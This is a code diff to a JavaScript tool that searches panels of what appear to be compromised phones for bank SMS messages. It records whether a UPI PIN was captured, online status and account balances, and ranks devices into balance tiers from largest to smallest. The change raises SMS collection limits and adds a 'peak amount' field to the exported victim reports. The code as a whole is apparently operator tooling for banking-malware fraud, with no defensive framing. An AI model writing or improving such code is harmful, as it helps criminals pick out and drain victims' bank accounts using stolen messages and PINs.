@@ -1,5 +1,5 @@
 import { fetchAllPanels, normalizeFirebaseUrl } from './panelCore.mjs';
-import { processBankMessages, formatSmsWhen } from './bankSms.mjs';
+import { processBankMessages, formatSmsWhen, devicePeakAmount } from './bankSms.mjs';
 
 const TIERS = {
   low_high: { min: 2_000, max: 50_000, label: 'BAL 2K–50K (bada→chota)', sort: 'desc' },
@@ -9,7 +9,7 @@ const TIERS = {
   user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
 };
 
-const SMS_LIMIT = { 1: 700, 3: 1000, 7: 1400, 15: 2000, 30: 2500, 0: 3000 };
+const SMS_LIMIT = { 1: 1200, 3: 1800, 7: 2200, 15: 2800, 30: 3200, 0: 4000 };
 
 export function parseSearchCommand(text) {
   const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
@@ -140,7 +140,9 @@ export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, e
     } else {
       lines.push('UPI PIN: NO');
     }
-    if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
+    const peak = d.peakAmount || devicePeakAmount(d);
+    if (peak) lines.push(`Peak Amount: Rs.${peak.toLocaleString('en-IN')}`);
+    else if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
     lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
     lines.push(`Panel: ${d.panelName || '—'}`);
   lines.push('');
@@ -185,7 +187,8 @@ export async function runSearch(panels, opts, onProgress) {
           if (!r.bankSmsCount) return;
           if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
           const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
-          const amt = row.maxBalance || row.maxTxn || 0;
+          const amt = devicePeakAmount(row);
+          row.peakAmount = amt;
           const allAmt = tier.allAmounts || opts.tier === 'mixed_all';
           if (!allAmt) {
             if (amt > 0 && (amt < tier.min || amt > tier.max)) return;
@@ -206,18 +209,25 @@ export async function runSearch(panels, opts, onProgress) {
 
   const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
   filtered.sort((a, b) => {
-    const aa = a.maxBalance || a.maxTxn || 0;
-    const ab = b.maxBalance || b.maxTxn || 0;
+    const aa = a.peakAmount || devicePeakAmount(a);
+    const ab = b.peakAmount || devicePeakAmount(b);
     return ab - aa;
   });
 
   const elapsed = Date.now() - t0;
   const text = buildExportText(filtered, opts, tier, panels.length, panelsHit.size, elapsed);
   const sms = filtered.reduce((s, r) => s + r.bankSms.length, 0);
+  const withBank = results.length;
   return {
     results: filtered,
     text,
-    stats: { devices: filtered.length, sms, panelsHit: panelsHit.size },
+    stats: {
+      devices: filtered.length,
+      sms,
+      panelsHit: panelsHit.size,
+      scanned: devices.length,
+      withBankSms: withBank,
+    },
     elapsed,
     tier,
     opts,
